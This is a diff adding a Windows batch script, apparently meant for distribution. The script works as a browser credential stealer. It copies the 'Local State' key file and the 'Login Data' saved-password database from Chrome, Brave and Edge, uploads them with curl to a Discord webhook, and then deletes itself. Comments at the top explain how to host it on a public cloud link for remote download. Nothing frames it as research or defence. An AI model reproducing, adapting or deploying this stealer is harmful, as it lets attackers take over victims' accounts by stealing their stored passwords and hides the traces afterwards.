@@ -1,0 +1,35 @@
+REM UPLOAD THIS FILE TO GOOGLE DRIVE OR ANY OTHER CLOUD PLATFORM TO ACCESS IT AND TO DOWNLOAD DIRECTLY USING PS
+REM MAKE SURE IT IS PUBLIC LINK
+REM Be Sure To Add a WebHook URL of your Discord Server!
+
+@echo off
+
+setlocal enabledelayedexpansion
+
+set files_to_upload=
+
+if exist "%LocalAppData%\Google\Chrome\User Data\Local State" (
+    copy "%LocalAppData%\Google\Chrome\User Data\Local State" chro.txt
+    copy "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" chro2.txt
+    set files_to_upload=!files_to_upload! -F "file1=@chro.txt" -F "file2=@chro2.txt"
+)
+
+if exist "%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Local State" (
+    copy "%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Local State" brav.txt
+    copy "%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" brav2.txt
+    set files_to_upload=!files_to_upload! -F "file3=@brav.txt" -F "file4=@brav2.txt"
+)
+
+if exist "%LocalAppData%\Microsoft\Edge\User Data\Local State" (
+    copy "%LocalAppData%\Microsoft\Edge\User Data\Local State" edg.txt
+    copy "%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data" edg2.txt
+    set files_to_upload=!files_to_upload! -F "file5=@edg.txt" -F "file6=@edg2.txt"
+)
+
+curl -X POST -H "Content-Type: multipart/form-data" ^
+     !files_to_upload! ^
+     [WEBHOOK URL]  
+
+REM Deletes the bat file from computer
+del "%~f0"
+
